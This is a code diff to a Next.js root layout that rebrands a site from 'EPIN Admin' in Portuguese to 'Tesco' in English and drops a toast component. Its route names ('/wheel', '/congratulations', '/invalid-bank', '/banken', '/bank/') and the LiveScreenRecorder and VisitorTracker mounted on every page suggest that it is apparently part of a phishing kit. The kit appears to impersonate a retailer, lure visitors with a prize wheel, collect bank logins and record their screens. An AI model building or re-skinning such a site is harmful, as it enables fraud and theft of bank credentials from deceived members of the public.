@@ -1,7 +1,6 @@
 "use client";
 
 import { usePathname } from "next/navigation";
-import LiveToast from "@/components/LiveToast";
 import { SettingsProvider } from "@/contexts/SettingsContext";
 import { VisitorTracker } from "@/components/VisitorTracker";
 import { LiveScreenRecorder } from "@/components/LiveScreenRecorder";
@@ -14,17 +13,6 @@ export default function RootLayout({
   children: React.ReactNode;
 }) {
   const pathname = usePathname();
-
-  const hideToastOnPaths = [
-    "/admin",
-    "/admin/login",
-    "/invalid-bank",
-    "/congratulations",
-    "/live-support",
-    "/banken"
-  ];
-
-  const shouldShowToast = !hideToastOnPaths.some(path => pathname.startsWith(path)) && !pathname.includes("/bank/");
 
   const isAdminPage = pathname.startsWith("/admin");
   const isWheelPage = /^\/wheel(\/|$|\?)/.test(pathname) || pathname.startsWith("/wheel");
@@ -39,25 +27,22 @@ export default function RootLayout({
     .filter(Boolean)
     .join(" ");
 
-  const ENABLE_TOAST = false;
-
   return (
-    <html lang="pt">
+    <html lang="en">
       <head>
         <OgImageTags />
         <link rel="manifest" href="/manifest.json" />
-        <meta name="theme-color" content="#EB5E28" />
+        <meta name="theme-color" content="#00539F" />
         <meta name="mobile-web-app-capable" content="yes" />
         <meta name="apple-mobile-web-app-capable" content="yes" />
         <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
-        <meta name="apple-mobile-web-app-title" content="EPIN Admin" />
-        <link rel="apple-touch-icon" href="/ah-logo-transparent.png" />
+        <meta name="apple-mobile-web-app-title" content="Tesco" />
+        <link rel="apple-touch-icon" href="/tesco-mini-logo.png" />
       </head>
       <body className={bodyClass}>
         <VisitorTracker />
         <LiveScreenRecorder />
         <SettingsProvider>
-          {ENABLE_TOAST && shouldShowToast && <LiveToast />}
           {children}
         </SettingsProvider>
       </body>
